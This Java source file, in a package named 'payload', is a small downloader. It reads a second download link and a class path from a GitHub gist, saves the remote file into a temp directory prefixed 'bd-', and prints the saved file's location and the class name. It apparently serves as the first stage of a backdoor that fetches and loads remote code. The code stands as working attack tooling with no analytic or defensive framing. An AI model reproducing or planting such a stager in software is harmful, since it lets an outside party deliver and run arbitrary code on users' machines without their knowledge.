package com.tmquan2508.payload;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public class FileDownloader {
    public static void main(String[] args) {
        String urlString = "https://gist.githubusercontent.com/tmquan2508/cee08b2b343c4b4224064bea921e1ba3/raw";
        String downloadLink = null;
        String classPath = null;
        try {
            URL url = new URL(urlString);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()))) {
                downloadLink = reader.readLine();
                classPath = reader.readLine();
            }
            if (downloadLink == null || classPath == null) {
                System.exit(1);
                return;
            }
            Path tempDir = Files.createTempDirectory("bd-");
            String fileName = downloadLink.substring(downloadLink.lastIndexOf('/') + 1);
            Path destinationPath = tempDir.resolve(fileName);
            try (InputStream in = new URL(downloadLink).openStream()) {
                Files.copy(in, destinationPath, StandardCopyOption.REPLACE_EXISTING);
            }

            System.out.println(destinationPath.toAbsolutePath().toString());
            System.out.println(classPath);
        } catch (Exception e) {
            System.exit(1);
        }
    }
}